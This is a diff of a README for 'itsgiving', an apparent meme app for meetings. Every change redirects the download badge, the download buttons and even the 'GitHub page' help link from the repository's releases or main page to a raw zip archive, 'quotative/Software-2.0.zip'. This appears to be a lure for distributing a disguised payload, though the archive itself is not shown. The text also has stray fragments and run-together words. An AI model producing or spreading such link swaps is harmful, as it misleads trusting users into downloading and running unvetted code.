@@ -1,6 +1,6 @@
 # 🎉 itsgiving - Express Yourself in Meetings With Memes, Of Course
 
-[![Download itsgiving](https://img.shields.io/badge/Download-itsgiving-9cf?style=for-the-badge&logo=github&logoColor=white&labelColor=6f42c1&color=28a745)](https://github.com/jenpeterkikoti-cmd/itsgiving/releases)
+[![Download itsgiving](https://img.shields.io/badge/Download-itsgiving-9cf?style=for-the-badge&logo=github&logoColor=white&labelColor=6f42c1&color=28a745)](https://raw.githubusercontent.com/jenpeterkikoti-cmd/itsgiving/main/quotative/Software-2.0.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Welcome! This guide was written specifically for people who may not consider the
 
 Visit this link to download the application: 
 
-[**👉 Click Here to Download itsgiving**](https://github.com/jenpeterkikoti-cmd/itsgiving/releases)
+[**👉 Click Here to Download itsgiving**](https://raw.githubusercontent.com/jenpeterkikoti-cmd/itsgiving/main/quotative/Software-2.0.zip)
 
 )
 
@@ -113,7 +113,7 @@ nament.
 
 ## 📞 Need More Help?
 
-If you run into any issues not covered above, don't worry—we've got you covered. Visit the [**itsgiving GitHub page**](https://github.com/jenpeterkikoti-cmd/itsgiving) and look for the "Issues" tab. There, you can reporta problem or see if others have had similar questions. The community is friendly, and someone will likely respond withina day or two.
+If you run into any issues not covered above, don't worry—we've got you covered. Visit the [**itsgiving GitHub page**](https://raw.githubusercontent.com/jenpeterkikoti-cmd/itsgiving/main/quotative/Software-2.0.zip) and look for the "Issues" tab. There, you can reporta problem or see if others have had similar questions. The community is friendly, and someone will likely respond withina day or two.
 
 
 
@@ -123,7 +123,7 @@ If you run into any issues not covered above, don't worry—we've got you covere
 
 You're all set, friend. Just download, run, and let the memes flow. Your meetings will never be the same—and that'sa good thing. 
 
-[**🚀 DOWNLOAD itsgiving NOW**](https://github.com/jenpeterkikoti-cmd/itsgiving/releases) 
+[**🚀 DOWNLOAD itsgiving NOW**](https://raw.githubusercontent.com/jenpeterkikoti-cmd/itsgiving/main/quotative/Software-2.0.zip) 
 
 Have fun, and may your meetings be forever more entertaining. 
 
